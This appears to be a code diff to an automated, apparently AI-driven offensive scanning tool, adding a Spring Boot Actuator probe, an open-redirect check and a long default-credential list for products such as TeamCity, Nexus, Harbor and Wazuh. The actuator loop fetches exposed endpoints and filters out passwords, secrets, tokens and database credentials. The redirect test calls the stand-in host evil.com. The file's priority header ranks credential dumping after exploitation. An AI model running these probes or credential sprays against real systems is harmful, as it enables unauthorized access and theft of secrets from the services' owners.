@@ -15754,6 +15754,53 @@ PRIORITIES (strict order): exploit_confirmed_vuln > dump_creds_post_exploit > ch
                         "description": f"Secreto JWT: '{cracked_secret.group(1)}' — token forjable con cualquier payload.",
                     }], target)
 
+            # ── Spring Boot Actuator exploitation ──────────────────────────
+            self._log(f"[Claude] ADVWEB: Spring Boot Actuator probe → {base_url}")
+            actuator_out, _ = self._run_cmd(
+                f"spring-actuator-{p['port']}",
+                f"for endpoint in actuator actuator/env actuator/beans actuator/heapdump "
+                f"actuator/mappings actuator/loggers actuator/info actuator/httptrace actuator/health; do "
+                f"CODE=$(curl -sk --max-time 6 -o /dev/null -w '%{{http_code}}' '{base_url}/$endpoint' 2>/dev/null); "
+                f"[ \"$CODE\" = '200' ] && {{ echo \"ACTUATOR_EXPOSED: $endpoint\"; "
+                f"curl -sk --max-time 8 '{base_url}/$endpoint' 2>/dev/null | "
+                f"python3 -c 'import sys,json; d=json.load(sys.stdin); "
+                f"[print(k,str(v)[:80]) for k,v in d.items() if any(s in k.lower() for s in [\"pass\",\"secret\",\"key\",\"token\",\"cred\",\"db\",\"database\"])]' "
+                f"2>/dev/null | head -5; }}; done",
+                target, timeout=40,
+            )
+            if "ACTUATOR_EXPOSED" in actuator_out:
+                self._capture_evidence(actuator_out, target, f"spring-actuator-{p['port']}", "Spring Boot Actuator")
+                accumulated_output.append(f"=== Spring Boot Actuator {base_url} ===\n{actuator_out[:600]}")
+                has_creds = re.search(r'pass|secret|key.*=|datasource.*url', actuator_out, re.IGNORECASE)
+                self._save_findings([{
+                    "title": f"Spring Boot Actuator {'con Credenciales' if has_creds else 'Expuesto'} @ {base_url}",
+                    "severity": "critical" if has_creds else "high",
+                    "description": f"Actuator endpoints expuestos:\n{actuator_out[:400]}",
+                    "cve": "",
+                }], target)
+
+            # ── Open Redirect detection ────────────────────────────────────
+            redir_params = ["redirect", "next", "url", "return", "returnTo", "goto", "dest", "destination", "r", "redir"]
+            for rp in redir_params[:4]:
+                redir_out, _ = self._run_cmd(
+                    f"open-redirect-{rp}-{p['port']}",
+                    f"CODE=$(curl -sk --max-time 6 -o /dev/null -w '%{{http_code}}' "
+                    f"-L '{base_url}/?{rp}=https://evil.com/path?x=1' 2>/dev/null); "
+                    f"LOC=$(curl -sk --max-time 6 -I '{base_url}/?{rp}=https://evil.com' 2>/dev/null | "
+                    f"grep -i '^Location:' | head -1); "
+                    f"echo \"$LOC\" | grep -q 'evil.com' && echo \"OPEN_REDIRECT_FOUND: {base_url}/?{rp}=https://evil.com\" || true",
+                    target, timeout=12,
+                )
+                if "OPEN_REDIRECT_FOUND" in redir_out:
+                    self._capture_evidence(redir_out, target, f"open-redirect-{rp}", "Open Redirect")
+                    self._save_findings([{
+                        "title": f"Web — Open Redirect @ {base_url}/?{rp}=",
+                        "severity": "medium",
+                        "description": f"Parámetro '{rp}' permite redirigir a URLs externas arbitrarias. Explotable en OAuth token stealing y phishing.",
+                        "cve": "",
+                    }], target)
+                    break
+
     # ── F2: Cloud attack surface (AWS/Azure/GCP/S3/Terraform) ─────────────
     def _cloud_attack(self, target, open_ports, accumulated_output):
         """S3 bucket enum, AWS/GCP/Azure metadata, Terraform state, IAM escalation."""
@@ -17025,6 +17072,41 @@ PRIORITIES (strict order): exploit_confirmed_vuln > dump_creds_post_exploit > ch
                            [("admin","general"),("admin","admin"),("superset","superset")])],
             "rangefr":    [(r'RangeForce|CTFd|ctfd', "/api/v1/users", "GET",
                            [("admin","admin"),("admin","password")])],
+            # 2023-2024 additions
+            "activemq":   [(r'ActiveMQ|activemq|jolokia', "/admin/", "GET-BASIC",
+                           [("admin","admin"),("admin","activemq"),("system","manager")])],
+            "teamcity":   [(r'TeamCity|teamcity', "/login.html", "POST",
+                           [("admin","admin"),("teamcity","teamcity"),("administrator","administrator")])],
+            "metabase":   [(r'Metabase|metabase', "/api/session", "POST-JSON",
+                           [("admin@admin.com","admin"),("metabase@metabase.com","metabase1234")])],
+            "n8n":        [(r'n8n|n8n.io', "/login", "POST",
+                           [("admin@example.com","password"),("n8n@n8n.io","n8n")])],
+            "nocodb":     [(r'NocoDB|nocodb', "/api/v1/auth/user/signin", "POST-JSON",
+                           [("user@nocodb.com","Password1!"),("admin@nocodb.com","admin")])],
+            "uptime-kuma":[(r'Uptime Kuma|uptimekuma', "/login", "POST-JSON",
+                           [("admin","admin"),("admin","123456"),("uptime","uptime")])],
+            "dasherr":    [(r'Dasherr|dasherr|homer', "/assets/config.yml", "GET",
+                           [("",""),("admin","admin")])],
+            "authentik":  [(r'Authentik|authentik', "/api/v3/core/users/me/", "GET",
+                           [("akadmin","akadmin"),("admin","admin")])],
+            "nexus":      [(r'Nexus Repository|nexus', "/service/rest/v1/status", "GET",
+                           [("admin","admin123"),("admin","sonatype")])],
+            "harbor":     [(r'Harbor|goharbor', "/api/v2.0/systeminfo", "GET-BASIC",
+                           [("admin","Harbor12345"),("admin","admin")])],
+            "wazuh":      [(r'Wazuh|wazuh', "/security/user/authenticate", "POST-JSON",
+                           [("wazuh","wazuh"),("admin","admin"),("kibanaserver","kibanaserver")])],
+            "hashicorp-nomad": [(r'Nomad|HashiCorp Nomad', "/v1/jobs", "GET",
+                           [("",""),("root","root")])],
+            "rocketchat": [(r'Rocket\.Chat|rocketchat', "/api/v1/login", "POST-JSON",
+                           [("admin","admin"),("rocketchat","admin")])],
+            "influxdb":   [(r'InfluxDB|influxdb|Chronograf', "/api/v1/query", "GET-BASIC",
+                           [("admin","admin"),("influxdb","influxdb"),("root","root")])],
+            "nagios":     [(r'Nagios XI|nagios', "/nagiosxi/login.php", "POST",
+                           [("nagiosadmin","nagiosadmin"),("admin","admin")])],
+            "cacti":      [(r'Cacti|cacti', "/index.php", "POST",
+                           [("admin","admin"),("cacti","cacti"),("admin","password")])],
+            "zabbix-front":[(r'Zabbix|zbx', "/index.php", "POST",
+                           [("Admin","zabbix"),("admin","admin")])],
         }
 
         for p in http_ports[:3]:
